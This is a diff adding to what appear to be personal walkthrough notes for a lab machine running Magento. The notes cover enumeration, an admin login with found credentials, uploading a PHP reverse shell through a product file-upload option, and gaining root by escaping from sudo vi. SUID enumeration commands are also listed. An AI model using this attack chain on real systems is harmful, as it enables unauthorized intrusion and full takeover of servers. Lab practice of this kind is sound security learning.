@@ -1,4 +1,8 @@
-
+#################################
+Magento CMS 
+RCE - Exploit via Python + PHP_Reverse_Shell
+Linux NO TTY + Limited Env Priv ESC
+#################################
 
 1-Enumeration:
     nmap -T5 -sV -sC -Pn 10.10.10.140 -oN enum/scan1.logs -vv
@@ -34,6 +38,8 @@
         Check http://10.10.10.140/index.php/admin with creds forme:forme
 
 
+
+
 2-Exploit:
     Once Loged:
         Go to the “Manage Products” page (from catalog menu)
@@ -43,4 +49,39 @@
         Then, back to the shopping site, I clicked the item which I’ve edited and chose “php-reverse-shell.php”. Clicking “ADD TO CART” button lets you to upload this webshell to the server.
 
         http://10.10.10.140/media/custom_options/quote/s/h/
+
+
+
+    Privilege Escalation:
+        First we need an INTERACTIVE SHELL:
+        https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1
+            python3 -c "import pty; pty.spawn('/bin/bash')" 
+
+
+        Then we checked what are the things that we can run as root within the www-data user:
+        
+        sudo -l:
+            User www-data may run the following commands on swagshop:
+            (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+            Execute commands like the admin or the root by typing sudo vi /var/www/html/some_file_name:
+                sudo vi /var/www/html/lol
+
+
+            Exit from vim:
+                :!/bin/bash
+
+            We are now Root !!!!!!!!!
+
+
+         Privilege Escalation SUID:
+                -Documentation: https://gtfobins.github.io/
+                find / -perm -u=s -type f 2>/dev/null 
+                    or
+                find / -perm +6000 2>/dev/null
+
+
+
+       
+
 
